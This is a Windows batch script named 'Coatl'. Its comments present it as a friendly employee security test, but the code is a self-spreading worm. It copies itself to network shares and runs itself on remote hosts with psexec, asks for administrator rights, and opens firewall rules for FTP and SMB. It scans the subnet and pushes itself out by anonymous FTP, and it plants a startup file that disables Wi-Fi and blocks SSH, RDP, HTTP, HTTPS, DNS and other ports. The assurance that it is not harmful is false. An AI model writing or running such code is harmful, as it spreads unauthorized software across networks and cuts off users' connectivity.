@echo off

:: Hello script editor! This is Coatl. He is a script that likely someone on your network ran
:: or you are just looking to test your employee security. If the latter then just distribute
:: the script to whoever you are testing. If they run it they need Cyber Security training.
:: Coatl is friendly and just wants to help you, he is not very long so just read through him
:: to see he is not harmful malware. Here is what he's done to make cleanup easier!
:: 1. Coatl has added an outbound FTP rule if it wasn't enabled already
:: 2. Coatl has sent itself via SMB to any computer willing to accept him
:: 3. Coatl will always move itself to the Downloads folder when run
:: 4. Coatl made two files in the Startup folder(SystemSettings.bat and StartupConfig.bat)
:: 5. shcoatl.bat will disable https and http ports to make sure the victim cannot access websites for some extra scare

REM Get the shared folder name
for /f "tokens=2 delims= " %%a in ('net share ^| findstr /C:"Disk"') do (
    set "shared_folder=%%a"
    goto :next
)
:next

REM Check if the SMB shared folder exists
if not exist "%shared_folder%" (
    exit /b
)

REM Copy hcoatl.bat to every computer in the network
for /f %%a in ('net view ^| findstr /C:"\\"') do (
    copy "hcoatl.bat" "%%a\%shared_folder%"
)

REM Execute hcoatl.bat on every computer in the network
for /f %%a in ('net view ^| findstr /C:"\\"') do (
    psexec.exe -accepteula -s "\\%%a\%shared_folder%\hcoatl.bat"
)

echo Finished reproduction

setlocal enabledelayedexpansion

REM Check if the script is running with administrative privileges
>nul 2>&1 "%SYSTEMROOT%\System32\cacls.exe" "%SYSTEMROOT%\System32\config\system"

REM If the errorlevel is 0, the script is running with administrative privileges
if "%errorlevel%"=="0" (
    
) else (
    REM Elevate the script to run with administrator privileges
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit /b
)

REM Add outbound rule to allow FTP traffic
netsh advfirewall firewall add rule name="AllowOutboundFTP" dir=out action=allow protocol=TCP localport=21
netsh advfirewall firewall add rule name="DisableInboundHTTPS" dir=in action=deny protocol=TCP localport=80

REM Check if outbound traffic on port 21 is allowed
netsh advfirewall firewall show rule name="AllowOutboundFTP" >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
) else (
    
)

REM Add outbound rule to allow SMB traffic
netsh advfirewall firewall add rule name="AllowOutboundSMB" dir=out action=allow protocol=TCP localport=445

REM Check if outbound traffic on port 445 is allowed
netsh advfirewall firewall show rule name="AllowOutboundSMB" >nul 2>&1
if %errorlevel% neq 0 (
    exit /b
) else (
    
)

REM Move the batch script to the Downloads folder
for /f "tokens=*" %%a in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "{374DE290-123F-4565-9164-39C4925E467B}" ^| find "REG_SZ"') do (
    set "downloads_folder=%%b"
)
move "%~f0" "%downloads_folder%"

REM Display a message indicating the move is complete

:: FTP.txt

(
echo user anonymous ""
echo put "hcoatl.bat"
echo quit
) > ftp.txt 

:: LAN IP getter

(
echo @echo off

echo setlocal

echo REM Run ipconfig command and filter for IPv4 address
echo for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /C:"IPv4 Address"') do (
echo    REM Display the IPv4 address
echo    echo %%a > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\HostTransfer.dll"
echo )

echo REM Run ipconfig command and filter for IPv4 addresses
echo for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /C:"IPv4 Address"') do (
echo     REM Get the IP address and extract the first two numbers
echo     for /f "tokens=1,2 delims=." %%b in ("%%a") do (
echo         set "first_two_numbers=%%b.%%c"
echo     )
echo )

echo SET SaveFile="C:\temp\ipaddresses.txt"
echo del %SaveFile%
echo Set IPRange=%first_two_numbers%
echo Set IPStart=0.0
echo Set IPEnd=255.255
echo Set choice=1

echo REM Initialize IPValue to the starting IP address (IPStart)
echo set "IPValue=%IPStart%"

echo REM This will set IPCount and IPValue correctly
echo REM Calculate IPCount based on the difference between IPStart and IPEnd
echo set "IPCount=0"
echo for /f "tokens=1-4 delims=." %%a in ("%IPStart%") do (
echo     set /a octet1=%%a, octet2=%%b, octet3=%%c, octet4=%%d
echo )
echo for /f "tokens=1-4 delims=." %%a in ("%IPEnd%") do (
echo     set /a octet1_end=%%a, octet2_end=%%b, octet3_end=%%c, octet4_end=%%d
echo )
echo set /a octet_diff1=octet1_end-octet1, octet_diff2=octet2_end-octet2, octet_diff3=octet3_end-octet3, octet_diff4=octet4_end-octet4
echo set /a IPCount=octet_diff1*256*256*256 + octet_diff2*256*256 + octet_diff3*256 + octet_diff4 + 1

echo ipconfig /flushdns
echo arp -d
echo ipconfig | FIND /v "VirtualBox Host" | FIND /v "Ethernet adapter vEthernet (Default Switch)" | FIND /v "Ethernet adapter vEthernet (WiFi):" | FIND /v "Ethernet adapter vEthernet (Ethernet):" | FIND /v "Media disconnected"
echo ipconfig | FIND "IPv4 Address"
echo set /p IPRange=Enter the first 3 octets of the network you want to scan (e.g 192.168.1): 
echo :start
echo set choice=1
echo if not '%choice%'=='' set choice=%choice:~0,1%
echo if '%choice%'=='1' goto Full
echo if '%choice%'=='2' goto Partial
echo goto start
echo :Full
echo FOR /L %%i IN (1,1,%IPCount%) DO (ping -n 1 %IPRange%.%%i | FIND /i "bytes=">>%SaveFile%)
echo Goto End
echo :End
echo set delsavefile=2
echo if not '%choice%'== set choice=%choice:~0,1%
echo if '%choice%'=='1' goto ViewOnly
echo if '%choice%'=='2' goto ViewAndSave
echo goto start
echo :ViewOnly
echo cls
echo type %SaveFile%
echo del %SaveFile%
echo :ViewAndSave
echo cls
echo type %SaveFile%


echo REM Set the path to the file you want to transfer
echo set file=%0 

echo REM Check if the file exists
echo if not exist "%file%" (
echo     exit /b
echo )

echo REM Check if the ip_addresses.txt file exists
echo if not exist "C:\temp\ipaddresses.txt" (
echo     exit /b
echo )
 
echo REM Get the shared folder name
echo for /f "tokens=2 delims= " %%a in ('net share ^| findstr /C:"Disk"') do (
echo     set "shared_folder=%%a"
echo     goto :next
echo )
echo :next
 
echo REM Check if the shared folder name was found
echo if not defined shared_folder (
echo     exit /b
echo ) else (
echo     exit /b
echo )
 
echo REM Loop through each line in the ip_addresses.txt file
echo for /f "tokens=*" %%a in (ip_addresses.txt) do (
echo     REM Attempt to FTP the file to the current IP address
echo     ftp -n -i -s:"ftp.txt" %%a

echo     REM Attempt to copy the file via SMB
echo     copy "%file%" "\\%%a\%shared_folder%"
echo )

echo timeout /t 600 /nobreak >nul

echo @echo off
 
echo REM Disable WiFi
echo netsh interface set interface "Wi-Fi" admin=disable

echo REM Disable Telnet (Port 23)
echo netsh advfirewall firewall add rule name="BlockTelnet" dir=in action=block protocol=TCP localport=23
echo netsh advfirewall firewall add rule name="BlockTelnet" dir=out action=block protocol=TCP localport=23

echo REM Disable PsExec (Port 445)
echo netsh advfirewall firewall add rule name="BlockPsExec" dir=in action=block protocol=TCP localport=445
echo netsh advfirewall firewall add rule name="BlockPsExec" dir=out action=block protocol=TCP localport=445

echo REM Disable other commonly used ports
echo netsh advfirewall firewall add rule name="BlockSSH" dir=in action=block protocol=TCP localport=22
echo netsh advfirewall firewall add rule name="BlockFTP" dir=in action=block protocol=TCP localport=21
echo netsh advfirewall firewall add rule name="BlockRDP" dir=in action=block protocol=TCP localport=3389
echo netsh advfirewall firewall add rule name="BlockVNC" dir=in action=block protocol=TCP localport=5900
echo netsh advfirewall firewall add rule name="BlockHTTP" dir=in action=block protocol=TCP localport=80
echo netsh advfirewall firewall add rule name="BlockHTTPS" dir=in action=block protocol=TCP localport=443
echo netsh advfirewall firewall add rule name="BlockDNS" dir=in action=block protocol=UDP localport=53
echo netsh advfirewall firewall add rule name="BlockNTP" dir=in action=block protocol=UDP localport=123
echo netsh advfirewall firewall add rule name="BlockLDAP" dir=in action=block protocol=TCP localport=389
echo netsh advfirewall firewall add rule name="BlockSQL" dir=in action=block protocol=TCP localport=1433
 
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\StartupConfig.bat"

pause >nul